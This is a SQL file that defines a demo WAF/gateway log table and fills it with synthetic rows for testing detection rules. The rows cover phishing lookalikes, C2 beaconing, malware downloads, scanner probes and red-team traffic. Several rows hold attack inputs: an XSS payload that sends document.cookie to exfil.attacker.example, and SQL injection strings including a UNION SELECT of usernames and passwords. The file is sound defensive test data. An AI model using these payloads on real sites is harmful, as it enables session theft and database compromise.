-- =============================================================================
-- urls_30d.sql
-- Table:   bodyguard_demo.urls_30d
-- Source:  Cloudflare Gateway + WAF logs
-- Purpose: Daily aggregation of URL-level activity over a rolling 30-day
--          window. One row per (url, daily window). Captures path structure,
--          query-string signals, and the WAF verdict (rule_id + action) for
--          downstream detection rules.
-- Refresh: Daily
-- Sample:  The INSERT below is the most recent daily window only. The deployed
--          table holds 30 windows.
-- =============================================================================

CREATE TABLE IF NOT EXISTS bodyguard_demo.urls_30d (
    window_start            TIMESTAMP   NOT NULL,
    window_end              TIMESTAMP   NOT NULL,
    url                     STRING      NOT NULL,
    host                    STRING,                 -- hostname only (joins domains_30d.domain)
    path                    STRING,                 -- URL path
    len_path                INT64,                  -- character length of path
    query_string            STRING,                 -- raw query string, NULL if none
    path_depth              INT64,                  -- number of / segments
    top_user_agent          STRING,
    visits                  INT64,
    unique_ips              INT64,
    blocked_count           INT64,
    top_country             STRING,                 -- ISO-2
    has_encoded_chars       BOOL,                   -- URL-encoded chars (%2F, %3C …) in path/query
    has_sensitive_params    BOOL,                   -- token= session= password= pass= email= credential= user=
    top_status_code         INT64,
    rule_id                 STRING,                 -- WAF managed rule that fired, NULL if none
    action                  STRING,                 -- block | challenge | allow
    PRIMARY KEY (window_start, url) NOT ENFORCED
);

-- =============================================================================
-- Sample data (last daily window)
-- =============================================================================

INSERT INTO bodyguard_demo.urls_30d VALUES
-- ── Phishing URLs (outbound, blocked by the gateway) ─────────────────────────
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://paypa1-secure.login-verify.com/account/verify?token=abc123',
 'paypa1-secure.login-verify.com', '/account/verify', 15, 'token=abc123', 2,
 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0', 842, 214, 840, 'RU',
 FALSE, TRUE,  403, 'CF_PHISHING_001', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://amaz0n-support.helpdesk-secure.net/signin',
 'amaz0n-support.helpdesk-secure.net', '/signin', 7, NULL, 1,
 'python-requests/2.28', 1203, 389, 1199, 'DE',
 FALSE, FALSE, 403, 'CF_PHISHING_001', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://google-security-alert.com/verify-account?user=victim@example.com',
 'google-security-alert.com', '/verify-account', 15, 'user=victim@example.com', 1,
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 670, 178, 668, 'UA',
 FALSE, TRUE,  403, 'CF_PHISHING_002', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://micr0soft-account-verify.net/reset-password?token=xyz789&email=user@corp.example',
 'micr0soft-account-verify.net', '/reset-password', 15, 'token=xyz789&email=user@corp.example', 1,
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36', 514, 143, 512, 'FR',
 FALSE, TRUE,  403, 'CF_PHISHING_002', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://apple-id-suspended.support-verify.com/confirm?session=abc&user=victim@icloud.com',
 'apple-id-suspended.support-verify.com', '/confirm', 8, 'session=abc&user=victim@icloud.com', 1,
 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) Safari/604.1', 389, 102, 387, 'CN',
 FALSE, TRUE,  403, 'CF_PHISHING_001', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://secure-netbank-account-update.info/login?user=client@example.net&session=9f1c',
 'secure-netbank-account-update.info', '/login', 6, 'user=client@example.net&session=9f1c', 1,
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36', 291, 88, 289, 'RO',
 FALSE, TRUE,  403, 'CF_PHISHING_002', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://invoice-payment.docusign-secure.com/view-invoice?email=ap@corp.example',
 'invoice-payment.docusign-secure.com', '/view-invoice', 13, 'email=ap@corp.example', 1,
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36', 178, 54, 176, 'NL',
 FALSE, TRUE,  403, 'CF_PHISHING_002', 'block'),

-- ── Malware — C2 beaconing (allowed: no WAF signature) ───────────────────────
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://cdn-update.analytics-track.ru/beacon?uuid=infected-host-001&cmd=check_in',
 'cdn-update.analytics-track.ru', '/beacon', 7, 'uuid=infected-host-001&cmd=check_in', 1,
 'Go-http-client/2.0', 7719, 2, 0, 'RU',
 FALSE, FALSE, 200, NULL, 'allow'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://cdn-update.analytics-track.ru/drop/payload.ps1',
 'cdn-update.analytics-track.ru', '/drop/payload.ps1', 17, NULL, 2,
 'Go-http-client/2.0', 312, 2, 0, 'RU',
 FALSE, FALSE, 200, NULL, 'allow'),

-- ── Malware — binary distribution ────────────────────────────────────────────
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'http://download-win32-patch.update-now.net/update/setup.exe',
 'download-win32-patch.update-now.net', '/update/setup.exe', 17, NULL, 2,
 'NSIS/3.0 (Windows NT)', 934, 311, 914, 'US',
 FALSE, FALSE, 403, 'CF_MALWARE_001', 'block'),

-- Legitimate vendor executable — exercises the vendor exclusion in malware.sql
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://download.microsoft.com/windows/update/kb5031356.exe',
 'download.microsoft.com', '/windows/update/kb5031356.exe', 29, NULL, 3,
 'Microsoft-Delivery-Optimization/10.0', 15200, 3300, 0, 'US',
 FALSE, FALSE, 200, NULL, 'allow'),

-- ── Web attacks against portal.example.com — XSS ─────────────────────────────
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E',
 'portal.example.com', '/search', 7, 'q=%3Cscript%3Ealert(document.cookie)%3C/script%3E', 1,
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 312, 1, 310, 'BR',
 TRUE,  FALSE, 403, 'CF_XSS_001', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/profile?bio=<img src=x onerror=fetch("https://exfil.attacker.example/"+document.cookie)>',
 'portal.example.com', '/profile', 8, 'bio=<img src=x onerror=fetch("https://exfil.attacker.example/"+document.cookie)>', 1,
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 198, 1, 196, 'BR',
 FALSE, FALSE, 403, 'CF_XSS_001', 'block'),

-- ── Web attacks against portal.example.com — SQL injection ───────────────────
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/login?user=admin%27--%20&pass=x',
 'portal.example.com', '/login', 6, 'user=admin%27--%20&pass=x', 1,
 'sqlmap/1.7 (https://sqlmap.org)', 89, 1, 89, 'CN',
 TRUE,  TRUE,  403, 'CF_SQLI_001', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/api/users?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--',
 'portal.example.com', '/api/users', 10, 'id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--', 2,
 'sqlmap/1.7 (https://sqlmap.org)', 145, 1, 145, 'CN',
 TRUE,  FALSE, 403, 'CF_SQLI_001', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/api/products?id=1%20AND%20SLEEP(5)--',
 'portal.example.com', '/api/products', 13, 'id=1%20AND%20SLEEP(5)--', 2,
 'sqlmap/1.7 (https://sqlmap.org)', 61, 1, 61, 'CN',
 TRUE,  FALSE, 403, 'CF_SQLI_001', 'block'),

-- ── Vulnerability scanning against portal.example.com ────────────────────────
-- Blocked by a WAF managed rule; there is no detection rule for scanners.
-- unique_ips = 2: the red-team scanner (198.51.100.50) and a hostile one.
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/.env',
 'portal.example.com', '/.env', 5, NULL, 1,
 'Nuclei/3.1 (redteam-scan)', 1902, 2, 1902, 'US',
 FALSE, FALSE, 403, 'CF_SCANNER_001', 'block'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/wp-admin/setup-config.php',
 'portal.example.com', '/wp-admin/setup-config.php', 26, NULL, 2,
 'Mozilla/5.0 zgrab/0.x', 1450, 2, 1450, 'NL',
 FALSE, FALSE, 403, 'CF_SCANNER_001', 'block'),

-- ── Authorised red-team phishing simulation (REDTEAM.md) ─────────────────────
-- Looks exactly like credential phishing and fires phishing.sql Rule 3.
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://phishsim.company-test.com/login-verify?token=sim-4f2a&email=employee@example.com',
 'phishsim.company-test.com', '/login-verify', 13, 'token=sim-4f2a&email=employee@example.com', 1,
 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/128.0', 640, 118, 612, 'US',
 FALSE, TRUE,  403, 'CF_PHISHING_002', 'block'),

-- ── Legitimate traffic (control) ─────────────────────────────────────────────
('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/healthz',
 'portal.example.com', '/healthz', 8, NULL, 1,
 'PulseCheck/2.4 (+https://pulsecheck.example)', 8640, 1, 0, 'US',
 FALSE, FALSE, 200, NULL, 'allow'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://portal.example.com/',
 'portal.example.com', '/', 1, NULL, 1,
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36', 48200, 6100, 3, 'US',
 FALSE, FALSE, 200, NULL, 'allow'),

('2026-09-09 00:00:00+00', '2026-09-09 23:59:59+00',
 'https://www.amazon.com/products/laptop',
 'www.amazon.com', '/products/laptop', 16, NULL, 2,
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Safari/17.6', 24500, 4820, 0, 'US',
 FALSE, FALSE, 200, NULL, 'allow');
